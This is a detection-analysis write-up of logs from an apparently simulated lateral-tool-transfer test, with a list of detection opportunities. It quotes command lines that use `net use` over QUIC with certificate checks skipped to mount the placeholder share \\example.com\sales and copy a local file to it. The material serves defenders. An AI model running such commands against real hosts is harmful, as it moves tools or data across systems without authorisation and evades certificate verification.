# T1570-2: Lateral Tool Transfer — NET USE

## Technique Context

T1570 (Lateral Tool Transfer) covers adversary movement of tools or files between
systems. This test is the command-line equivalent of T1570-1: using `net use` with
the `/TRANSPORT:QUIC` and `/SKIPCERTCHECK` switches (available in Windows 11 21H2+)
to mount an SMB over QUIC share. The `net use` vector is notable because it is a
built-in OS command available to any user, requires no PowerShell, and is trivially
scriptable. The test attempts to mount `\\example.com\sales` over QUIC and copy
`C:\path\to\file.txt` to the mapped drive.

## What This Dataset Contains

**Sysmon EID 1** — process create for `net.exe`:

> `CommandLine: "C:\Windows\system32\net.exe" USE * \\example.com\sales /TRANSPORT:QUIC /SKIPCERTCHECK`
> `RuleName: technique_id=T1018,technique_name=Remote System Discovery`

The sysmon-modular config fires the T1018 rule on `net.exe`, not a service-specific rule.

**Sysmon EID 1** — PowerShell process create:

> `CommandLine: "powershell.exe" & {NET USE * '\\example.com\sales' /TRANSPORT:QUIC /SKIPCERTCHECK`
> `copy 'C:\path\to\file.txt' '*:\'}`

**Sysmon EID 22** — DNS queries from `svchost.exe` processes for `example.com`:

> `QueryResults: ::ffff:104.18.27.120;::ffff:104.18.26.120;` (Cloudflare CDN)

Multiple DNS queries appear (three), reflecting both IPv4 and IPv6 resolution paths
from different `svchost.exe` instances — one with `QueryStatus: 0` (success) and others
with the same resolved IPs, indicating the name was resolved but the QUIC connection
subsequently failed.

**Sysmon EID 7, 10, 11, 17** — standard PowerShell test framework artifacts: DLL image loads
tagged with T1055/T1574.002 rules, process access events, PowerShell profile file
creates, and named pipe creation.

**Security EID 4688/4689** — process lifecycle for `powershell.exe`, `net.exe`,
`whoami.exe` under SYSTEM.

**Security EID 4703** — token right adjustment.

**Application EID 16394** — "Offline downlevel migration succeeded." This is an SMB
client-side event from the `LanmanWorkstation` or `mrxsmb` component, logged when the
client attempts QUIC transport negotiation. Its presence indicates the QUIC connection
path was attempted at the kernel/driver level before failing.

**PowerShell EID 4104** — script blocks capturing the test payload and test framework
boilerplate.

## What This Dataset Does Not Contain (and Why)

**No successful share mount.** `example.com` does not expose SMB over QUIC. The
Application EID 16394 confirms the QUIC path was tried and failed gracefully.

**No Sysmon EID 3 for the net.exe connection.** `net.exe` relies on kernel-mode SMB
drivers for its network activity; Sysmon does not capture kernel-mode network operations
in the same way as userspace process connections. Only user-space initiated TCP connections
are typically captured by Sysmon EID 3.

**No file copy events.** The copy command in the test payload is not reached because the
drive mapping fails.

**No Security EID 4625 (logon failure).** SMB over QUIC failures in this context result
in a transport-level error rather than an authentication failure event.

## Assessment

This dataset captures richer lateral movement indicators than T1570-1 because `net.exe`
is caught by Sysmon's include-mode rules (via the T1018 net.exe pattern), providing a
labeled process create event. The combination of `net use` with QUIC transport switches
and the Application EID 16394 migration event forms a solid three-source correlation.
The multiple DNS queries to the target domain add temporal anchoring. This test offers
complementary coverage to T1570-1: one dataset shows the PowerShell API path
(`New-SmbMapping`), the other the command-line path (`net use`).

## Detection Opportunities Present in This Data

- **Sysmon EID 1 / Security EID 4688** — `net.exe` with `/TRANSPORT:QUIC` and
  `/SKIPCERTCHECK` flags is an unambiguous indicator; no legitimate administrative
  tooling uses these switches in current enterprise practice.
- **PowerShell EID 4104** — the `NET USE` command with QUIC flags is captured verbatim
  in script block logging regardless of whether execution proceeds.
- **Application EID 16394** — "offline downlevel migration" appearing immediately after
  a `net use` command with QUIC switches is a useful correlation signal for unsuccessful
  QUIC share mount attempts.
- **Sysmon EID 22** — DNS queries to external hostnames (non-RFC1918, non-domain) from
  processes associated with SMB operations under SYSTEM may indicate QUIC-based lateral
  movement preparation.
- **Multiple DNS queries for the same name** — the three DNS queries for `example.com`
  within the 9-second test window (both IPv4 and IPv6 variants) from multiple svchost
  instances is a pattern worth correlating with concurrent `net use` or `New-SmbMapping`
  command lines.
